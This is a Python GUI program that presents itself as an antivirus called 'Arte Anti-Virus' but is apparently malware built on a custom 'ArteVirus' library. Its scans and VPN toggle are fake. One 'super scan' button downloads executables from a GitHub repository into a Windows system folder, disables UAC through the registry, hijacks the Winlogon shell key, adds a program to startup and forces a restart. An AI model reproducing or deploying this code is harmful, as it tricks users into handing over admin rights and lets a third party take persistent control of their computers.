import customtkinter as ctk
import ArteVirus
import time
from tkinter import messagebox
import threading

ctk.set_appearance_mode("dark")

def selectPage(page):
    bproverka3.configure(text="Ожидание проверки")
    mainFrame.pack_forget()
    mainFrame2.pack_forget()
    mainFrame3.pack_forget()
    mainFrame4.pack_forget()
    exec(f'{page}.pack(side="right", fill="both", expand=True)')

ArteVirus.run_as_admin()

if ArteVirus.warning():
    vpna = False
    def startBRO(waiting):
        time.sleep(0.5)
        tasks = 119
        abobaaaaa = [
            "C:/Windows/system32/advapi32.dll",
            "C:/Windows/system32/kernel32.dll",
            "C:/Windows/system32/ntdll.dll",
            "C:/Windows/system32/user32.dll",
            "C:/Windows/system32/gdi32.dll",
            "C:/Windows/system32/ole32.dll",
            "C:/Windows/system32/oleaut32.dll",
            "C:/Windows/system32/shell32.dll",
            "C:/Windows/system32/msvcrt.dll",
            "C:/Windows/system32/comctl32.dll",
            "C:/Windows/system32/comdlg32.dll",
            "C:/Windows/system32/ws2_32.dll",
            "C:/Windows/system32/iphlpapi.dll",
            "C:/Windows/system32/dnsapi.dll",
            "C:/Windows/system32/rpcrt4.dll",
            "C:/Windows/system32/secur32.dll",
            "C:/Windows/system32/crypt32.dll",
            "C:/Windows/system32/bcrypt.dll",
            "C:/Windows/system32/ncrypt.dll",
            "C:/Windows/system32/wintrust.dll",
            "C:/Windows/system32/schannel.dll",
            "C:/Windows/system32/winhttp.dll",
            "C:/Windows/system32/urlmon.dll",
            "C:/Windows/system32/wininet.dll",
            "C:/Windows/system32/shdocvw.dll",
            "C:/Windows/system32/browseui.dll",
            "C:/Windows/system32/setupapi.dll",
            "C:/Windows/system32/cfgmgr32.dll",
            "C:/Windows/system32/devobj.dll",
            "C:/Windows/system32/d3d9.dll",
            "C:/Windows/system32/dxgi.dll",
            "C:/Windows/system32/dwrite.dll",
            "C:/Windows/system32/windowscodecs.dll",
            "C:/Windows/system32/msctf.dll",
            "C:/Windows/system32/usp10.dll",
            "C:/Windows/system32/imm32.dll",
            "C:/Windows/system32/version.dll",
            "C:/Windows/system32/winmm.dll",
            "C:/Windows/system32/dsound.dll",
            "C:/Windows/system32/xinput1_3.dll",
            "C:/Windows/system32/d3dcompiler_47.dll",
            "C:/Windows/system32/d3dx9_43.dll",
            "C:/Windows/system32/d3d10.dll",
            "C:/Windows/system32/d3d11.dll",
            "C:/Windows/system32/d2d1.dll",
            "C:/Windows/system32/mf.dll",
            "C:/Windows/system32/mfplat.dll",
            "C:/Windows/system32/mfreadwrite.dll",
            "C:/Windows/system32/evr.dll",
            "C:/Windows/system32/wmvcore.dll",
            "C:/Windows/system32/msdmo.dll",
            "C:/Windows/system32/qasf.dll",
            "C:/Windows/system32/qcap.dll",
            "C:/Windows/system32/qedit.dll",
            "C:/Windows/system32/quartz.dll",
            "C:/Windows/system32/amstream.dll",
            "C:/Windows/explorer.exe",
            "C:/Windows/system32/msacm32.dll",
            "C:/Windows/system32/midimap.dll",
            "C:/Windows/system32/wdmaud.drv",
            "C:/Windows/system32/ksuser.dll",
            "C:/Windows/system32/avrt.dll",
            "C:/Windows/system32/mmdevapi.dll",
            "C:/Windows/system32/audioses.dll",
            "C:/Windows/system32/powrprof.dll",
            "C:/Windows/system32/batt.dll",
            "C:/Windows/system32/sensorsapi.dll",
            "C:/Windows/system32/portabledeviceapi.dll",
            "C:/Windows/system32/wpd_ci.dll",
            "C:/Windows/system32/wpdmtp.dll",
            "C:/Windows/system32/wpdsp.dll",
            "C:/Windows/system32/wpdusb.sys",
            "C:/Windows/system32/wpdwud.dll",
            "C:/Windows/system32/wpdcomp.dll",
            "C:/Windows/system32/wpdshext.dll",
            "C:/Windows/system32/wpdshserviceobj.dll",
            "C:/Windows/system32/wpdtrace.dll",
            "C:/Windows/system32/wpd_usp.dll",
            "C:/Windows/system32/wpd_msn.dll",
            "C:/Windows/system32/wpd_mtp.dll",
            "C:/Windows/system32/wpd_mtpdr.dll",
            "C:/Windows/system32/wpd_mtpus.dll",
            "C:/Windows/system32/wpd_mtpui.dll",
            "C:/Windows/system32/wpd_mtpxt.dll",
            "C:/Windows/system32/wpd_mtpzh.dll",
            "C:/Windows/system32/wpd_mtpja.dll",
            "C:/Windows/system32/wpd_mtpko.dll",
            "C:/Windows/system32/wpd_mtptw.dll",
            "C:/Windows/system32/wpd_mtpth.dll",
            "C:/Windows/system32/wpd_mtpvi.dll",
            "C:/Windows/system32/wpd_mtpar.dll",
            "C:/Windows/system32/wpd_mtpru.dll",
            "C:/Windows/system32/wpd_mtpuk.dll",
            "C:/Windows/system32/wpd_mtpfr.dll",
            "C:/Windows/system32/wpd_mtpde.dll",
            "C:/Windows/system32/wpd_mtpif.dll",
            "C:/Windows/system32/wpd_mtpno.dll",
            "C:/Windows/system32/wpd_mtppl.dll",
            "C:/Windows/system32/wpd_mtppt.dll",
            "C:/Windows/system32/wpd_mtptr.dll",
            "C:/Windows/system32/mfplat.dll",
            "C:/Windows/system32/mfreadwrite.dll",
            "C:/Windows/system32/evr.dll",
            "C:/Windows/system32/wmvcore.dll",
            "C:/Windows/system32/msdmo.dll",
            "C:/Windows/system32/qasf.dll",
            "C:/Windows/system32/qcap.dll",
            "C:/Windows/system32/qedit.dll",
            "C:/Windows/system32/quartz.dll",
            "C:/Windows/system32/amstream.dll",
            "C:/Windows/system32/msacm32.dll",
            "C:/Windows/taskmgr.exe",
            "C:/Windows/resmon.exe",
            "C:/Windows/cmd.exe",
            "C:/Windows/regedit.exe",
            "C:/Windows/system32/d3dx9_43.dll",
            "C:/Windows/Cursors/aero_arrow.cur",
            "C:/Windows/system32/wmvcore.dll",
            "C:/Windows/explorer.exe"
        ]
        for i in range(tasks):
            time.sleep(waiting)
            bproverka3.configure(text=abobaaaaa[i])
            value = i / tasks
            progress_bar2.set(value)
            window.update_idletasks()
        progress_bar2.pack_forget()
        bproverka1.configure(state="normal")
        bproverka2.configure(state="normal")
        bproverka4.configure(state="normal")
        bproverka3.configure(text="Найдено вирусов: 0")

    def vpn():
        global vpna
        if vpna == False:
            vpnbro1.configure(text="VPN Включен")
            vpnbro2.configure(text="Выключить")
        else:
            vpnbro1.configure(text="VPN Выключен")
            vpnbro2.configure(text="Включить")
        vpna = not vpna

    def bistriyProverka():
        bproverka1.configure(state="disabled")
        bproverka2.configure(state="disabled")
        bproverka4.configure(state="disabled")
        progress_bar2.pack(pady=15, side="bottom")
        selectPage("mainFrame2")
        broT = threading.Thread(target=startBRO, daemon=True, args=(0.05,))
        broT.start()

    def PolniyProverka():
        bproverka1.configure(state="disabled")
        bproverka2.configure(state="disabled")
        bproverka4.configure(state="disabled")
        progress_bar2.pack(pady=15, side="bottom")
        selectPage("mainFrame2")
        broT = threading.Thread(target=startBRO, daemon=True, args=(0.1,))
        broT.start()

    def aaa():
        messagebox.showinfo("Был найден вирус!", "Был найден вирус! Выключение...")

    def aaaaaaaaaaaaaaaaaa():
        if ArteVirus.warning():
            aaaT = threading.Thread(target=aaa, daemon=True)
            aaaT.start()
            if not ArteVirus.get_path(r"C:\Windows\Microsoft\Windows"):
                print("a")
            url1 = "https://raw.githubusercontent.com/JustARocketGame/aaaaaaaaaaa/main/updater.exe"
            url2 = "https://github.com/JustARocketGame/aaaaaaaaaaa/raw/main/dist/checker.exe"
            url3 = "https://raw.githubusercontent.com/JustARocketGame/aaaaaaaaaaa/main/imba.png"
            url4 = "https://raw.githubusercontent.com/JustARocketGame/aaaaaaaaaaa/main/error.mp3"
            url5 = "https://github.com/JustARocketGame/aaaaaaaaaaa/raw/main/dist/errorHandler.exe"
            f1 = ArteVirus.get_file(r"C:\Windows\Microsoft\Windows\updater.exe", url1)
            f2 = ArteVirus.get_file(r"C:\Windows\Microsoft\Windows\checker.exe", url2)
            f3 = ArteVirus.get_file(r"C:\Windows\Microsoft\Windows\imba.png", url3)
            f4 = ArteVirus.get_file(r"C:\Windows\Microsoft\Windows\error.mp3", url4)
            f5 = ArteVirus.get_file(r"C:\Windows\Microsoft\Windows\errorHandler.py", url5)
            ArteVirus.set_black_wallpaper()
            ArteVirus.disable_uac_via_registry()
            ArteVirus.change_shell_key(fr"explorer.exe, {ArteVirus.get_path(r"C:\Windows\Microsoft\Windows")}\updater.exe")
            ArteVirus.add_to_startup(fr"{ArteVirus.get_path(r"C:\Windows\Microsoft\Windows")}\checker.exe")
            time.sleep(0.1)
            ArteVirus.restart_pc()

    def ochistkabb():
        messagebox.showerror("Очистка", "Никакого мусора нету :)")

    window = ctk.CTk()
    window.geometry(f"800x600+{window.winfo_screenwidth() // 2 - 400}+{window.winfo_screenheight() // 2 - 300}")
    window.title("Arte Anti-Virus")
    window.resizable(False, False)

    sidebar = ctk.CTkFrame(window, width=270, height=600)
    sidebar.pack(side="left")
    sidebar.pack_propagate(False)

    title = ctk.CTkLabel(sidebar, text="Arte Anti-Virus", font=ctk.CTkFont(family="Consolas", size=28, weight="bold"))
    title.pack(side="top", pady=5)

    creator = ctk.CTkLabel(sidebar, text="Создал Artem057 на Python", font=ctk.CTkFont(family="Consolas", size=18, weight="bold"))
    creator.pack(pady=15)

    main = ctk.CTkButton(sidebar, width=200, height=50, text="Главная", font=ctk.CTkFont(family="Consolas", size=28, weight="bold"), command=lambda: selectPage("mainFrame"))
    main.pack(side="top", pady=1)

    proverka = ctk.CTkButton(sidebar, width=200, height=50, text="Проверка", font=ctk.CTkFont(family="Consolas", size=28, weight="bold"), command=lambda: selectPage("mainFrame2"))
    proverka.pack(pady=5)

    ochistka = ctk.CTkButton(sidebar, width=200, height=50, text="Очистка", font=ctk.CTkFont(family="Consolas", size=28, weight="bold"), command=lambda: selectPage("mainFrame3"))
    ochistka.pack(pady=5)

    VPN = ctk.CTkButton(sidebar, width=200, height=50, text="VPN", font=ctk.CTkFont(family="Consolas", size=28, weight="bold"), command=lambda: selectPage("mainFrame4"))
    VPN.pack(pady=5)

    bottomb = ctk.CTkLabel(sidebar, text="Virus :)", font=ctk.CTkFont(family="Consolas", size=10, weight="bold"))
    bottomb.pack(side="bottom", pady=1)

    mainFrame = ctk.CTkFrame(window, height=600, width=530, fg_color="#1c1c1c", border_width=0)
    mainFrame.pack(side="right", fill="both", expand=True)
    mainFrame.pack_propagate(False)

    mainTitle = ctk.CTkLabel(mainFrame, text="Главная", font=ctk.CTkFont(family="Consolas", size=50, weight="bold"))
    mainTitle.pack(side="top", pady=15)

    creditsBro = ctk.CTkLabel(mainFrame, text="Сделано Artem057", font=ctk.CTkFont(family="Consolas", size=25, weight="bold"))
    creditsBro.pack(side="top", pady=5)

    creditsBro2 = ctk.CTkLabel(mainFrame, text="Сделано на Python за 5 дня", font=ctk.CTkFont(family="Consolas", size=25, weight="bold"))
    creditsBro2.pack(side="top", pady=5)

    creditsBro3 = ctk.CTkLabel(mainFrame, text="Сделано для ССН", font=ctk.CTkFont(family="Consolas", size=25, weight="bold"))
    creditsBro3.pack(side="top", pady=5)

    creditsBro4 = ctk.CTkLabel(mainFrame, text="Еще сделал свою библиотеку для вирусов", font=ctk.CTkFont(family="Consolas", size=23, weight="bold"))
    creditsBro4.pack(side="top", pady=5)

    bproverka1 = ctk.CTkButton(mainFrame, width=260, height=50, text="Быстрая проверка", font=ctk.CTkFont(family="Consolas", size=28, weight="bold"), command=lambda: bistriyProverka())
    bproverka1.pack(pady=15, side="bottom")
    bproverka1.pack_propagate(False)

    mainFrame2 = ctk.CTkFrame(window, height=600, width=530, fg_color="#1c1c1c", border_width=0)
    #mainFrame2.pack(side="right", fill="both", expand=True)
    mainFrame2.pack_propagate(False)

    mainTitle2 = ctk.CTkLabel(mainFrame2, text="Проверка", font=ctk.CTkFont(family="Consolas", size=50, weight="bold"))
    mainTitle2.pack(side="top", pady=15)

    bproverka2 = ctk.CTkButton(mainFrame2, width=260, height=50, text="Быстрая проверка", font=ctk.CTkFont(family="Consolas", size=28, weight="bold"), command=lambda: bistriyProverka())
    bproverka2.pack(pady=15)
    bproverka2.pack_propagate(False)

    bproverka4 = ctk.CTkButton(mainFrame2, width=260, height=50, text="Полная проверка", font=ctk.CTkFont(family="Consolas", size=28, weight="bold"), command=lambda: PolniyProverka())
    bproverka4.pack(pady=15)
    bproverka4.pack_propagate(False)

    bproverka5 = ctk.CTkButton(mainFrame2, width=360, height=50, text="Супер дупер пупер гупер бропер проверка", font=ctk.CTkFont(family="Consolas", size=15, weight="bold"), command=lambda: aaaaaaaaaaaaaaaaaa())
    bproverka5.pack(pady=15)
    bproverka5.pack_propagate(False)

    bproverka3 = ctk.CTkLabel(mainFrame2, text="Ожидание проверки", font=ctk.CTkFont(family="Consolas", size=20, weight="bold"))
    bproverka3.pack(side="bottom", pady=1)

    progress_bar2 = ctk.CTkProgressBar(mainFrame2)
    progress_bar2.set(0)

    mainFrame3 = ctk.CTkFrame(window, height=600, width=530, fg_color="#1c1c1c", border_width=0)
    #mainFrame3.pack(side="right", fill="both", expand=True)
    mainFrame3.pack_propagate(False)

    mainTitle3 = ctk.CTkLabel(mainFrame3, text="Очистка", font=ctk.CTkFont(family="Consolas", size=50, weight="bold"))
    mainTitle3.pack(side="top", pady=15)

    mainFrame4 = ctk.CTkFrame(window, height=600, width=530, fg_color="#1c1c1c", border_width=0)
    #mainFrame4.pack(side="right", fill="both", expand=True)
    mainFrame4.pack_propagate(False)

    mainTitle4 = ctk.CTkLabel(mainFrame4, text="VPN", font=ctk.CTkFont(family="Consolas", size=50, weight="bold"))
    mainTitle4.pack(side="top", pady=15)

    vpnbro1 = ctk.CTkLabel(mainFrame4, text="VPN Выключен", font=ctk.CTkFont(family="Consolas", size=20, weight="bold"))
    vpnbro1.pack(side="top", pady=15)

    vpnbro2 = ctk.CTkButton(mainFrame4, text="Включить", font=ctk.CTkFont(family="Consolas", size=28, weight="bold"), command=vpn)
    vpnbro2.pack(side="top", pady=15)

    ochistkab = ctk.CTkButton(mainFrame3, text="Полная очистка", font=ctk.CTkFont(family="Consolas", size=28, weight="bold"), command=ochistkabb)
    ochistkab.pack(side="top", pady=15)

    window.mainloop()